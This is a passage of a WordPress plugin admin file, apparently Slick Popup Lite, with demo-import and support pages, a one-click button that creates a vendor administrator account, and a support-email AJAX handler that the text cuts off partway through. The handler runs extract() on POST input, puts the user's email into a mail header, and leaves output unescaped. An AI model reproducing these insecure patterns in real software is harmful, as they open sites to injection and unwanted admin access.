<?php

/**
 * Add Plugin's Admin Menu
 * Since Version 2.0  
 */	
add_action('admin_menu', 'splite_addmenu_page_in_admin', 99); 
function splite_addmenu_page_in_admin() {
	//add_options_page(__('All Settings'), __('All Settings'), 'administrator', 'options.php');
	global $_wp_last_object_menu;
	$_wp_last_object_menu++;

	global $splite_hook; 	
	$splite_hook = array();
	$icon = SPLITE_PLUGIN_URL . '/admin/img/menu_icon.png';
	
	$splite_hook[] = add_submenu_page( 'slick-options', 'Import Demos', 'Import Demos', 'manage_options', 'import-demos', 'splite_import_demos' );
	$splite_hook[] = add_submenu_page( 'slick-options', 'Help and Support', 'Help and Support', 'manage_options', 'help-and-support', 'splite_help_and_support' );
	//$hook = "load-".$splite_hook[0];
	
	//add_action($hook, 'splite_load_admin');	
}

add_action( 'admin_enqueue_scripts', 'splite_admin_enqueue_scripts' );
function splite_admin_enqueue_scripts( $hook_suffix ) {
	if ( false === strpos( $hook_suffix, 'slick' ) ) {
		return;
	}

	$bootstrap_4_pages = array(
		'import-demos',
		'help-and-support',
	);

	if (isset($_GET['page']) AND in_array($_GET['page'], $bootstrap_4_pages)) {
		wp_enqueue_style( 'bootstrap-min-css', 'https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css' );
		wp_enqueue_script( 'bootstrap-min-js', 'https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js' );
		wp_enqueue_script( 'jquery-tab', 'https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js' );
	}
}

/**
 * Import Demos Features
 * Since Version 2.0 - ToDo
 * @param none
 
 * @return none
 * Creates the post list table 
 */
function splite_import_demos() { ?>
	<style>
		p.notice {
			padding: 10px;
		}
		.section {
			overflow: hidden; 
			margin-bottom: 30px; 
		}
		.splite-btn {
		     
		}
		.splite-btn:hover {
		}
		.splite-btn-importer {
			float: right; 
		}
		.import-result {
			width: auto;
		    height: 30px;
		    padding: 10px 2px 5px 10px;
		    display: block;
		    font-family: sans-serif;
		    font-size: 20px;
		    font-weight: bold;
		    border-radius: 5px;
		    background: red;
		    color: white;
		    margin-top: 10px;
		    display: none;
		}
		
		.import-box {
			overflow: hidden; 
		}
		.import-box {
			float: left;
			margin: 0 29px 30px 0;
			position: relative;
			width: 30.6%;
			border: 1px solid #ddd;
			box-shadow: 0 1px 1px -1px rgba(0,0,0,.1);
			box-sizing: border-box;
		}
		.import-box:last-child {
			margin-right: 0; 
		}
		.import-box img {
			max-height: 280px;
			width: 100%;
		}
		.import-box img:hover {
			transform: scale(0.99);
		}
		.import-box-title {
			padding: .25rem 1rem;
		}
		.splite-label {
			font-weight: bold; 
		}
		.splite-btn-importer {
			
		}
		.splite-import-handle {
			float: right; 
		}
		.import-box-result {
			text-align: center;
			padding: 3px 10px;
			color: #efefef;
			position: absolute;
			width: 100%;
			bottom: 30px;
			line-height: 1.3em; 
		}
		.import-box-result a {
			color: #efefef; 
		}
		.import-box-result.success {
			background: green; 
			color: #efefef; 
		}
		.import-box-result.error {
			background: red; 
			color: #efefef; 
			margin: 0 !important; 
		}
		@media only screen and (max-width: 769px) {
			.section-inline {
				display: block;
				width: auto; 
				margin-right: 0; 
			}
		}
	</style>
	
	<div class="wrap">
		<div class="card col-md-12">
			<span class="card-title text-center m-2 display-4"><?php echo esc_html( __( "Import CF7 Demo Forms", 'slick-popup' ) ); ?></span>
			<div class="card-body m-2">
				<span style="font-size: 1.15rem;" class="text-info"><?php echo esc_html( __( "Choose a form and click import button, this will create a ", 'slick-popup' ) ); ?><strong><em><a href="<?php echo admin_url('/admin.php?page=wpcf7/'); ?>">Contact Form 7</a></em></strong><?php echo esc_html( __( " form with the desired layout. Once imported, you may want to change the To Email and Mail Body for the form.", 'slick-popup' ) ); ?><br><?php echo esc_html( __( "For any kind of suppport please email us at: ", 'slick-popup' ) ); ?><strong><em><a href="mailto:poke@slickpopup.com">poke@slickpopup.com</a></em></strong></span>
			</div>
		</div>
		<div class="notice-info settings-error notice is-dismissible mb-2 mt-3">
			<p style="font-weight:bold;" class="text-danger"><?php echo esc_html( __( "Note: This will just import the cf7 forms, you will have to create and edit the popups.", 'slick-popup' ) ); ?></p>
		</div>
		<div class="card col-md-12">
			<span class="card-subtitle text-secondary font-weight-normal m-2" style="font-size: 2rem;	"><?php echo esc_html( __( "One-click Import for Contact Form 7", 'slick-popup' ) ); ?></span>
			<div class="import-holder">
				<?php $demos = array(
					'basic-enquiry' => 'Basic Enquiry Form', 
					'subscribe' => 'Subscribe Form',
					'unsubscribe' => 	'Unsubscribe Form',				
					'get-a-quote' => 'Get a Quote Form',
					'survey' => 'Survey Form',
					'booking' => 'Booking Form',
				);
				$output = '';
					$output .= '<div id="welcome-panel" class="welcome-panel">';
						foreach($demos as $label => $demo) {			
							$output .='<div class="import-box">';
								$output .='<img src="'.splite_plugin_url('/libs/js/img/'.$label.'.jpg').'" title="'.$demo.'">'; 
								$output .='<div class="import-box-result" style="display:none;"></div>';
								$output .='<div class="import-box-title">';
									$output .='<span class="splite-label">'.$demo.'</span>';
									$output .='<span class="splite-import-handle">';
										$output .='<span class="splite-loader" style="visibility:hidden"><i class="fa fa-refresh fa-spin" style="font-size:14px;color:#f56e28;position:relative;left:-8px;"></i></span>';						
										$output .='<span class="splite-btn button-link splite-btn-importer splite-btn-importer" data-title="'.$label.'"><strong>Import</strong></span>';
									$output .='</span>';
								$output .='</div>';
							$output .='</div>';
						} 
					$output .='</div>';
				echo $output; 
				?>
			</div>
		</div>
		<div class="notice-info settings-error notice is-dismissible">
			<p style="font-weight:bold;"><?php echo esc_html( __( "For any kind of suppport please email us at:", 'slick-popup' ) ); ?> 
				<em><a href="mailto:poke@slickpopup.com">poke@slickpopup.com</a></em>
			</p>
		</div>
	</div>

<?php }

/**
 * Help and Support Page
 * Since Version 1.6.5 - ToDo
 * @param none
 
 * @return none
 * Creates the post list table 
 */
function splite_help_and_support() { ?>
	<style type="text/css">
		.wp-admin select {
			height: 38px;
		}
		.result-area {
			line-height: 1.5em;
			padding: 10px 15px;
		}
	</style>
	
	<?php 
		global $splite_opts; 
		$current_user =  wp_get_current_user();
		$username = isset($current_user->user_display_name) ? $current_user->user_display_name : (isset($current_user->user_firstname) and !empty($current_user->user_firstname)) ? $current_user->user_firstname : $current_user->user_login;
		$useremail = $current_user->user_email; 
	?>
	<div class="wrap">
		<div class="card col-md-12">
			<span class="card-title text-center m-2 display-4"><?php echo esc_html( __( "Help and Support", 'slick-popup' ) ); ?></span>
			<div class="card-body m-2">
				<ul class="nav nav-tabs nav-justified lead font-weight-bold" role="tablist">
					<li class="nav-item">
						<a class="nav-link active menu-links text-dark" data-toggle="tab" href="#menu1"><?php echo esc_html( __( "Basics", 'slick-popup' ) ); ?></a>
					</li>
					<li class="nav-item">
						<a class="nav-link menu-links text-dark" data-toggle="tab" href="#menu2"><?php echo esc_html( __( "Documentation", 'slick-popup' ) ); ?></a>
					</li>
					<li class="nav-item">
						<a class="nav-link menu-links text-dark" data-toggle="tab" href="#menu3"><?php echo esc_html( __( "Premium Features", 'slick-popup' ) ); ?></a>
					</li>
					<li class="nav-item">
						<a class="nav-link menu-links text-dark" data-toggle="tab" href="#menu4"><?php echo esc_html( __( "Support", 'slick-popup' ) ); ?></a>
					</li>
				</ul>
				<div class="tab-content">
					<div id="menu1" class="container tab-pane active"><br>
						<div class="row">
							<div class="col-md-6">
								<span style="font-size: 1.75rem; display:block;" class="text-info font-weight-bold"><?php echo esc_html( __( "How to create a Popup?", 'slick-popup' ) ); ?></span>
								<div class="text-body font-weight-normal">
									<?php echo esc_html( __( "Creating a Popup Form is very easy with Slick Popup.", 'slick-popup' ) ); ?>
									<ol type="1">
										<li><?php echo esc_html( __( "Create a Form via Contact Form 7", 'slick-popup' ) ); ?></li>
										<li><?php echo esc_html( __( "Go to Global Form Options", 'slick-popup' ) ); ?></li>
										<li><?php echo esc_html( __( "Select your Contact Form", 'slick-popup' ) ); ?></li>
										<li><?php echo esc_html( __( "Choose on which pages you want to show your Popup", 'slick-popup' ) ); ?></li>
										<li><?php echo esc_html( __( "Add the Popup Styles", 'slick-popup' ) ); ?></li>
										<li><?php echo esc_html( __( "Click on Save Changes and Checkout your Smart, Slick and Beautiful Popup Form", 'slick-popup' ) ); ?></li>
									</ol>
								</div>
							</div>
							<div class="col-md-6">
								<span style="font-size: 1.75rem; display:block;" class="text-info font-weight-bold"><?php echo esc_html( __( "How to Import the Demo Forms?", 'slick-popup' ) ); ?></span>
								<div class="text-body font-weight-normal">
									<?php echo esc_html( __( "To Import the Demo forms follow the following steps:", 'slick-popup' ) ); ?>
									<ol type="4">
										<li><?php echo esc_html( __( "Go to Import Demos", 'slick-popup' ) ); ?></li>
										<li><?php echo esc_html( __( "Choose the desirable Popup Form", 'slick-popup' ) ); ?></li>
										<li><?php echo esc_html( __( "Click on Import", 'slick-popup' ) ); ?></li>
										<li><span class="text-danger font-weight-bold"><?php echo esc_html( __( "Note: It is recommended that you go through the default setting of the imported Forms:", 'slick-popup' ) ); ?></span>
											<ol type="I" class="text-body font-weight-normal">
												<li><?php echo esc_html( __( "Click on ", 'slick-popup' ) ); ?><span class="font-weight-bold"><?php echo esc_html( __( "Edit Form", 'slick-popup' ) ); ?></span><?php echo esc_html( __( " to edit the Contact Form 7 and make changes in the mail tab", 'slick-popup' ) ); ?></li>
												<li><?php echo esc_html( __( "Click on ", 'slick-popup' ) ); ?><span class="font-weight-bold"><?php echo esc_html( __( "Set Popup", 'slick-popup' ) ); ?></span> <?php echo esc_html( __( "to add that form to your popup.", 'slick-popup' ) ); ?></li>
											</ol>
										</li>
									</ol>
								</div>
							</div>
						</div>
						<div class="row">
							<div class="col-md-6">
								<span style="font-size: 1.75rem; display:block;" class="text-info font-weight-bold"><?php echo esc_html( __( "How to Activate and Deactivate Slick Popup dynamically?", 'slick-popup' ) ); ?></span>
								<?php echo esc_html( __( "There are many ways to Activate and Deactivate Slick Popup dynamically:", 'slick-popup' ) ); ?>
								<ol type="circle">
									<li><span class="font-weight-bold"><?php echo esc_html( __( "Via Class:", 'slick-popup' ) ); ?></span><?php echo esc_html( __( " You can activate Slick Popup by using the class ", 'slick-popup' ) ); ?><span class="font-weight-bold">"splite-showpoup"</span>.<br><?php echo esc_html( __( 'For eg. <button class="splite-showpoup">Click Me</button>', 'slick-popup' ) ); ?></li>
									<li><span class="font-weight-bold"><?php echo esc_html( __( "Via Href or Url:", 'slick-popup' ) ); ?></span><?php echo esc_html( __( " You can activate Slick Popup by giving the url or href element of the a tag ", 'slick-popup' ) ); ?><span class="font-weight-bold">'javascript:splite_loader('id of the popup')'</span>.<br><?php echo esc_html( __( 'For eg. <button url="javascript:splite_loader();">Click Me</button>', 'slick-popup' ) ); ?></li>
									<li><?php echo esc_html( __( "If you want ", 'slick-popup' ) ); ?><span class="font-weight-bold"><?php echo esc_html( __( "unload", 'slick-popup' ) ); ?></span><?php echo esc_html( __( " the popup use ", 'slick-popup' ) ); ?><span class="font-weight-bold">'javascript:splite_unloader('id of the popup')'</span>.<br><?php echo esc_html( __( 'For eg. <button url="javascript:splite_unloader();">Click Me</button>', 'slick-popup' ) ); ?></li>
								</ol>
							</div>
							<div class="col-md-6">
								<span style="font-size: 1.75rem; display:block;padding-bottom: 40px" class="text-info font-weight-bold" style="margin-bottom: 40px"><?php echo esc_html( __( "Are there any filters available?", 'slick-popup' ) ); ?></span>
								<?php echo esc_html( __( "There are alot of filters available for Slick Popup Pro some of them are listed below:", 'slick-popup' ) ); ?>
								<ol type="circle">
									<li><span class="font-weight-bold">splite_dollar_cf7_id:</span><?php echo esc_html( __( " You can choose which CF7 form to show on the popup", 'slick-popup' ) ); ?></li>
									<li><span class="font-weight-bold">splite_dollar_side_button_text:</span><?php echo esc_html( __( " You can add custom side button text", 'slick-popup' ) ); ?></li>
									<li><span class="font-weight-bold">splite_dollar_choose_layout:</span><?php echo esc_html( __( " You can add custom layout to the popup", 'slick-popup' ) ); ?></li>
									<li><span class="font-weight-bold">splite_dollar_popup_load_effect:</span><?php echo esc_html( __( " You can add custom load effect to the popup", 'slick-popup' ) ); ?></li>
									<li><span class="font-weight-bold">splite_dollar_popup_unload_effect:</span><?php echo esc_html( __( " You can add custom unload effect to the popup", 'slick-popup' ) ); ?></li>
								</ol>
							</div>
						</div>
					</div>
					<div id="menu2" class="container tab-pane fade"><br>
						<div class="row">
							<div class="col-md-6">
								<span style="font-size: 1.75rem; display:block;" class="text-info font-weight-bold"><?php echo esc_html( __( "Color Schemes", 'slick-popup' ) ); ?></span>
								<div class="text-body font-weight-normal">
									<?php echo esc_html( __( "There are 5 built-in Color Schemes and you can always customise it according to your own requirements", 'slick-popup' ) ); ?>
									<ol type="1">
										<li><span class="font-weight-bold"><?php echo esc_html( __( "Master Red:-", 'slick-popup' ) ); ?></span> <div style="background:#ED1C24; height:20px; width:100px; display: inline-block;"></div></li>
										<li><span class="font-weight-bold"><?php echo esc_html( __( "Creamy Orange:-", 'slick-popup' ) ); ?></span> <div style="background:#EE5921; height:20px; width:100px; display: inline-block;"></div></li>
										<li><span class="font-weight-bold"><?php echo esc_html( __( "Light Blue:-", 'slick-popup' ) ); ?></span> <div style="background:#08ADDC; height:20px; width:100px; display: inline-block;"></div></li>
										<li><span class="font-weight-bold"><?php echo esc_html( __( "Cool Green:-", 'slick-popup' ) ); ?></span> <div style="background:#00A560; height:20px; width:100px; display: inline-block;"></div></li>
										<li><span class="font-weight-bold"><?php echo esc_html( __( "Classic Grey:-", 'slick-popup' ) ); ?></span> <div style="background:#484848; height:20px; width:100px; display: inline-block;"></div></li>
										<li><span class="font-weight-bold"><?php echo esc_html( __( "Custom Color:-", 'slick-popup' ) ); ?></span> <div style="background:#1e73be; height:20px; width:100px; display: inline-block;"></div></li>
									</ol>
								</div>
							</div>
							<div class="col-md-6">
								<span style="font-size: 1.75rem; display:block;" class="text-info font-weight-bold"><?php echo esc_html( __( "Animations", 'slick-popup' ) ); ?></span>
								<div class="text-body font-weight-normal">
									<?php echo esc_html( __( "There are more than 14 Loading Animations", 'slick-popup' ) ); ?>
									<ol>
										<div class="row">
											<div class="col-md-6">
												<li><?php echo esc_html( __( "Fade", 'slick-popup' ) ); ?></li>
												<li><?php echo esc_html( __( "Zoom", 'slick-popup' ) ); ?></li>
												<li><?php echo esc_html( __( "Rotate", 'slick-popup' ) ); ?></li>
												<li><?php echo esc_html( __( "Flip in X", 'slick-popup' ) ); ?>&nbsp;<span class="badge badge-success">Premium</span></li>
											</div>
											<div class="col-md-6">
												<li><?php echo esc_html( __( "Pulse", 'slick-popup' ) ); ?>&nbsp;<span class="badge badge-success">Premium</span></li>
												<li><?php echo esc_html( __( "Rubber Band", 'slick-popup' ) ); ?>&nbsp;<span class="badge badge-success">Premium</span></li>
												<li><?php echo esc_html( __( "Shake", 'slick-popup' ) ); ?>&nbsp;<span class="badge badge-success">Premium</span></li>
												<li><?php echo esc_html( __( "Swing", 'slick-popup' ) ); ?>&nbsp;<span class="badge badge-success">Premium</span></li>
											</div>
										</div>
									</ol>
								</div>
							</div>
							<div class="col-md-6">
								<span style="font-size: 1.75rem; display:block;" class="text-info font-weight-bold"><?php echo esc_html( __( "Activation Modes", 'slick-popup' ) ); ?></span>
								<div class="text-body font-weight-normal">
									<?php echo esc_html( __( "There are 5 Activation Modes:", 'slick-popup' ) ); ?>
									<ol type="1">
										<li><span class="font-weight-bold"><?php echo esc_html( __( "On-Click: ", 'slick-popup' ) ); ?></span> <?php echo esc_html( __( "Default is set to On-Click, The Popup will activate on the click of a Button or a HTML Element", 'slick-popup' ) ); ?></li>
										<li><span class="font-weight-bold"><?php echo esc_html( __( "On-Exit Popup: ", 'slick-popup' ) ); ?></span> <?php echo esc_html( __( "This will be activated whenever a user tries to Exit the page.", 'slick-popup' ) ); ?></li>
										<li><span class="font-weight-bold"><?php echo esc_html( __( "Auto Popup: ", 'slick-popup' ) ); ?></span> <?php echo esc_html( __( "This is the entry popup this is activated when the page is loaded.", 'slick-popup' ) ); ?>&nbsp;<span class="badge badge-success">Premium</span></li>
										<li><span class="font-weight-bold"><?php echo esc_html( __( "Forced Popup: ", 'slick-popup' ) ); ?></span> <?php echo esc_html( __( "This will not close until the user fills the complete form successfully", 'slick-popup' ) ); ?>&nbsp;<span class="badge badge-success">Premium</span></li>
										<li><span class="font-weight-bold"><?php echo esc_html( __( "On-Scroll Popup: ", 'slick-popup' ) ); ?></span> <?php echo esc_html( __( "This popup is activated when you scroll a certain amount of the page.", 'slick-popup' ) ); ?>&nbsp;<span class="badge badge-success">Premium</span></li>
									</ol>
								</div>
							</div>
							<div class="col-md-6">
								<span style="font-size: 1.75rem; display:block;" class="text-info font-weight-bold"><?php echo esc_html( __( "Typography", 'slick-popup' ) ); ?></span>
								<div class="text-body font-weight-normal">
									<?php echo esc_html( __( "There is a lot you can customise with typography in Slick Popup Pro", 'slick-popup' ) ); ?>
									<ol type="1">
										<li><span class="font-weight-bold"><?php echo esc_html( __( "CTA text:", 'slick-popup' ) ); ?></span><?php echo esc_html( __( " You have full control over the typography of the CTA text which is found over the top of the contact form", 'slick-popup' ) ); ?></li>
										<li><span class="font-weight-bold"><?php echo esc_html( __( "Label text:", 'slick-popup' ) ); ?></span><?php echo esc_html( __( " You can change the typography of the label text as well.", 'slick-popup' ) ); ?></li>
										<li><span class="font-weight-bold"><?php echo esc_html( __( "Side Button text:", 'slick-popup' ) ); ?></span><?php echo esc_html( __( " You can full customize the typography of the side button text.", 'slick-popup' ) ); ?></li>
									</ol>
								</div>
							</div>
							<div class="col-md-6">
								<span style="font-size: 1.75rem; display:block;" class="text-info font-weight-bold"><?php echo esc_html( __( "Side Buttons", 'slick-popup' ) ); ?></span>
								<div class="text-body font-weight-normal">
									<?php echo esc_html( __( "There are 8 pre-built Side Buttons:", 'slick-popup' ) ); ?>
									<ol>
										<div class="row">
											<div class="col-md-6">
												<li><?php echo esc_html( __( "Right", 'slick-popup' ) ); ?></li>
												<li><?php echo esc_html( __( "Left", 'slick-popup' ) ); ?></li>
												<li><?php echo esc_html( __( "Top Left", 'slick-popup' ) ); ?>&nbsp;<span class="badge badge-success">Premium</span></li>
												<li><?php echo esc_html( __( "Top Center", 'slick-popup' ) ); ?>&nbsp;<span class="badge badge-success">Premium</span></li>
											</div>
											<div class="col-md-6">
												<li><?php echo esc_html( __( "Top Right", 'slick-popup' ) ); ?>&nbsp;<span class="badge badge-success">Premium</span></li>
												<li><?php echo esc_html( __( "Bottom Left", 'slick-popup' ) ); ?>&nbsp;<span class="badge badge-success">Premium</span></li>
												<li><?php echo esc_html( __( "Bottom Center", 'slick-popup' ) ); ?>&nbsp;<span class="badge badge-success">Premium</span></li>
												<li><?php echo esc_html( __( "Bottom Right", 'slick-popup' ) ); ?>&nbsp;<span class="badge badge-success">Premium</span></li>
											</div>
										</div>
									</ol>
								</div>
							</div>
							<div class="col-md-6">
								<span style="font-size: 1.75rem; display:block;" class="text-info font-weight-bold"><?php echo esc_html( __( "Layouts", 'slick-popup' ) ); ?></span>
								<div class="text-body font-weight-normal">
									<?php echo esc_html( __( "There are more than 8 pre-built Side Buttons:", 'slick-popup' ) ); ?>
									<ol>
										<div class="row">
											<div class="col-md-6">
												<li><?php echo esc_html( __( "Centered", 'slick-popup' ) ); ?></li>
												<li><?php echo esc_html( __( "Full Height", 'slick-popup' ) ); ?></li>
												<li><?php echo esc_html( __( "Top Left", 'slick-popup' ) ); ?>&nbsp;<span class="badge badge-success">Premium</span></li>
												<li><?php echo esc_html( __( "Top Center", 'slick-popup' ) ); ?>&nbsp;<span class="badge badge-success">Premium</span></li>
											</div>
											<div class="col-md-6">
												<li><?php echo esc_html( __( "Top Right", 'slick-popup' ) ); ?>&nbsp;<span class="badge badge-success">Premium</span></li>
												<li><?php echo esc_html( __( "Bottom Center", 'slick-popup' ) ); ?>&nbsp;<span class="badge badge-success">Premium</span></li>
												<li><?php echo esc_html( __( "Bottom Right", 'slick-popup' ) ); ?>&nbsp;<span class="badge badge-success">Premium</span></li>
												<li><?php echo esc_html( __( "Full Page", 'slick-popup' ) ); ?>&nbsp;<span class="badge badge-success">Premium</span></li>
											</div>
										</div>
									</ol>
								</div>
							</div>
						</div>			
					</div>
					<div id="menu3" class="container tab-pane fade"><br>
						<div class="row">
							<div class="col-md-12">
								<span style="font-size: 2rem; display:block;" class="text-info text-center font-weight-bold mb-3"><?php echo esc_html( __( "Slick Popup Pro", 'slick-popup' ) ); ?></span>
								<div class="text-body font-weight-normal">
									<p style="font-size: 20px;"><?php echo esc_html( __( "Here are a few features that will be available in Slick Popup Pro.", 'slick-popup' ) ); ?></p>
									<ol style="font-size: 17px">
										<li class="text-secondary font-weight-bold"><?php echo esc_html( __( "Premium and Priority Support", 'slick-popup' ) ); ?></li>
										<li class="text-secondary font-weight-bold"><?php echo esc_html( __( "20+ animation effects to choose from", 'slick-popup' ) ); ?></li>
										<li class="text-secondary font-weight-bold"><?php echo esc_html( __( "Different popup for each woocommerce product", 'slick-popup' ) ); ?></li>
										<li class="text-secondary font-weight-bold"><?php echo esc_html( __( "Easy to create and insert shortcode", 'slick-popup' ) ); ?></li>
										<li class="text-secondary font-weight-bold"><?php echo esc_html( __( "Can be applied to link/image or HTML tag", 'slick-popup' ) ); ?></li>
										<li class="text-secondary font-weight-bold"><?php echo esc_html( __( "Multiple popups on single page", 'slick-popup' ) ); ?></li>
										<li class="text-secondary font-weight-bold"><?php echo esc_html( __( "Different Popups on different pages and posts", 'slick-popup' ) ); ?></li>
										<li class="text-secondary font-weight-bold"><?php echo esc_html( __( "Additional 3 activation modes", 'slick-popup' ) ); ?></li>
										<li class="text-secondary font-weight-bold"><?php echo esc_html( __( "Insights for all your popups", 'slick-popup' ) ); ?></li>
										<li class="text-secondary font-weight-bold"><?php echo esc_html( __( "reCAPTCHA Supported", 'slick-popup' ) ); ?></li>
										<li class="text-secondary font-weight-bold"><?php echo esc_html( __( "Scrollbar in Popup", 'slick-popup' ) ); ?></li>
										<li class="text-secondary font-weight-bold"><?php echo esc_html( __( "and many more......", 'slick-popup' ) ); ?></li>
									</ol>
								</div>
							</div>
						</div>	
					</div>
					<div id="menu4" class="container tab-pane fade"><br>
						<div class="row">
							<div class="col-md-6">
								<span style="font-size: 1.75rem; display:block;" class="text-info text-center font-weight-bold pb-2"><?php echo esc_html( __( "Contact Slick Popup Support", 'slick-popup' ) ); ?></span>
								<form method="post" class="splite-contact-support" action="">
									<div class="input-group mb-3">
									    <div class="input-group-prepend">
									      <span class="input-group-text"><?php echo esc_html( __( "Name", 'slick-popup' ) ); ?></span>
									    </div>
									    <input type="text" class="form-control" name="name" placeholder="<?php echo esc_html( __( "Enter your Name", 'slick-popup' ) ); ?>" value="<?php echo $username; ?>" >
									</div>
									<div class="input-group mb-3">
									    <div class="input-group-prepend">
									      <span class="input-group-text"><?php echo esc_html( __( "Email", 'slick-popup' ) ); ?></span>
									    </div>
									    <input type="text" class="form-control" name="email" placeholder="<?php echo esc_html( __( "Enter your Email", 'slick-popup' ) ); ?>" value="<?php echo $useremail; ?>" >
									</div>
									<div class="input-group mb-3">
									    <div class="input-group-prepend">
									      <span class="input-group-text"><?php echo esc_html( __( "Issue Subject", 'slick-popup' ) ); ?></span>
									    </div>
									    <input type="text" class="form-control" name="subject" placeholder="<?php echo esc_html( __( "Enter your Issue Subject", 'slick-popup' ) ); ?>">
									</div>
									<div class="input-group mb-3">
									    <div class="input-group-prepend">
									      <span class="input-group-text"><?php echo esc_html( __( "Page URL", 'slick-popup' ) ); ?></span>
									    </div>
									    	<?php 
												$args = array(
													'show_option_none' => 'All Pages',
													'name' => 'page_id',
													'class' => 'form-control',
												);
												wp_dropdown_pages($args); 
											?>
									</div>
									<div class="form-group mb-3">
									  <label for="message" class="font-weight-bold"><?php echo esc_html( __( "Issue Details:", 'slick-popup' ) ); ?></label>
									  <textarea class="form-control" name="message" rows="6" placeholder="<?php echo esc_html( __( "Please describe your issue in detail", 'slick-popup' ) ); ?>"></textarea>
									</div>
									<div class="input-group" style="margin:20px 0 10px;">
										<input type="submit" name="Submit" class="button button-primary splite-submit-btn">	
										<span class="splite-loader" style="margin-left:10px;visibility:hidden;"><i class="fa fa-refresh fa-spin" style="font-size:14px;color:#f56e28;position:relative;left:-8px;"></i></span>
									</div>
									<div class="input-group">
										<div class="result-area"></div>
									</div>
								</form>
							</div>
							<div class="col-md-6">
								<span style="font-size: 1.75rem; display:block;" class="text-info font-weight-bold text-center pb-"><?php echo esc_html( __( "One Step to Create an Admin User for Support", 'slick-popup' ) ); ?></span>
								<div class="text-body font-weight-normal">
									<p><?php echo esc_html( __( "In the past, many of our users were having problem to grant us access to the website so we can set the popup as they desired, that is the reason we have built this ", 'slick-popup' ) ); ?><strong><?php echo esc_html( __( "'Easy Grant Access'", 'slick-popup' ) ); ?></strong><?php echo esc_html( __( " feature.", 'slick-popup' ) ); ?></p>
									<p>
										<strong><?php echo esc_html( __( "It will create a new admin user for our email ", 'slick-popup' ) ); ?><em>poke@slickpopup.com</em> <?php echo esc_html( __( " with one click, making it easier for you to grant and revoke access.", 'slick-popup' ) ); ?></strong>
									<br><br>
									<?php 
										if(!username_exists('slickpopupteam') && !email_exists('poke@slickpopup.com'))
											echo '<button class="button button-primary splite-ajax-btn" data-ajax-action="action_splite_support_access" data-todo="createuser">Grant Access <i class="fa fa-user"></i></button>';
										else
											echo '<button class="button button-primary splite-ajax-btn" data-ajax-action="action_splite_support_access" data-todo="deleteuser">Revoke Access <i class="fa fa-user"></i></button>';
									
									echo '<span class="splite-loader" style="margin-left:10px;visibility:hidden;"><i class="fa fa-refresh fa-spin" style="font-size:14px;color:#f56e28;position:relative;left:-8px;"></i></span>';
									 								
										if(get_option('splite_grant_access_time')) {
											$splite_grant_access_time = get_option('splite_grant_access_time');
											$splite_grant_access_by = get_option('splite_grant_access_by');
											$date_object = DateTime::createFromFormat('Y-m-d H:i:s', $splite_grant_access_time); 
											$splite_grant_access_by = get_userdata($splite_grant_access_by); 
											
											echo '<div class="splite-last-granted">';
												echo '<strong>Last Granted</strong>: <span class="splite-last-granted-time">'. $date_object->format('j M, Y') . ' (' . $date_object->format('H:i A') . ') by <b>Username</b> - '.$splite_grant_access_by->user_login.'</span>';
											echo '</div>';
										}
									?>
									</p>	
								</div>
								<div class=""><div class="result-area"></div></div>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>
<?php }

/**
 * Takes the pain to return the correct action
 */
function splite_current_action() {
	//return 'copy'; 
	if ( isset( $_REQUEST['action'] ) && -1 != $_REQUEST['action'] ) {
		return $_REQUEST['action'];
	}

	if ( isset( $_REQUEST['action2'] ) && -1 != $_REQUEST['action2'] ) {
		return $_REQUEST['action2'];
	}

	return false;
}

add_action( 'wp_ajax_action_splite_contact_support', 'action_splite_contact_support' );
function action_splite_contact_support() {
	//print_r( $_POST['fields'] ); 
	$ajaxy = array(); 
	$errors = array(); 
	
	if( !isset($_POST) OR !isset($_POST['fields']) OR empty($_POST['fields']) ) {
		$ajaxy['reason'] = 'Nothing sent to server, please retry.'; 
	}

	parse_str($_POST['fields'], $posted); 	
	extract($posted); 
	
	// If Nothing is posted through AJAX
	if( !isset($name) OR empty($name) ) {
		$errors[] = 'Please enter your name'; 
	}
	if( !isset($email) OR empty($email) ) {
		$errors[] = 'Please enter your email'; 
	}
	if( !isset($subject) OR empty($subject) ) {
		$errors[] = 'Please enter a subject'; 
	}
	if( !isset($message) OR empty($message) ) {
		$errors[] = 'Please describe the issue your facing'; 
	}
	
	$pages = 'All Pages'; 
	if(!empty($page_id) AND is_numeric($page_id)) {
		$pages = '<a href="'.get_the_permalink($page_id).'" target="_blank">'.get_the_title($page_id).'</a>'; 
	}
	
	if(sizeof($errors)) {
		//$ajaxy['reason'] = '<ul>';
			//foreach($errors as $error) { $ajaxy['reason'] .= '<li>'.$error.'</li>'; }
		//$ajaxy['reason'] .= '</ul>';
		
		$ajaxy['reason'] = implode('<br>', $errors); 		
		wp_send_json_error($ajaxy); 
		wp_die(); 
	}
	
	// Always set content-type when sending HTML email
	$headers = "MIME-Version: 1.0" . "\r\n";
	$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
	$headers .= 'From: <'.$email.'>' . "\r\n";
	//$headers .= 'Cc: '.$email . "\r\n";
	
	$mail_subject = 'Slick Popup Lite support Required: ' . $name . ' - ' . $subject . ' (' . site_url(). ')';
	$mail_body = ''; 
	$mail_body .= '<b>Dear Team,<b><br><br>'; 
	$mail_body .= '<table border>';
		$mail_body .= '<tr>';
			$mail_body .= '<th style="padding: 10px 20px;" colspan="2">Slick Popup Lite</th>';
		$mail_body .= '</tr>';
		$mail_body .= '<tr>';
			$mail_body .= '<th style="padding: 10px 20px;">A new support request has been received from: </th><td style="padding: 10px 20px;">'.site_url().'</td>';
		$mail_body .= '</tr>';
		$mail_body .= '<tr>';	
			$mail_body .= '<th style="padding: 10px 20px;">Email: </th><td style="padding: 10px 20px;">'.$email.'</td>';
		$mail_body .= '</tr>';
		$mail_body .= '<tr>';	
			$mail_body .= '<th style="padding: 10px 20px;">Message: </th><td style="padding: 10px 20px;">'.$message.'</td>';
		$mail_body .= '</tr>';
		$mail_body .= '<tr>';	
			$mail_body .= '<th style="padding: 10px 20px;">Page: </th><td style="padding: 10px 20px;">'.$pages.'</td>';
		$mail_body .= '</tr>';
	$mail_body .= '</table>';
	
	$mail = wp_mail('poke@slickpopup.com', $mail_subject, $mail_body, $headers ); 
	
	if($mail) {
		$ajaxy['reason'] = 'Your request has been sent to support team, if you think that this issue will require admin access for our then please grant access to the <strong>Support Team</strong> by clicking the button on the right. Please wait for a response by our team.'; 
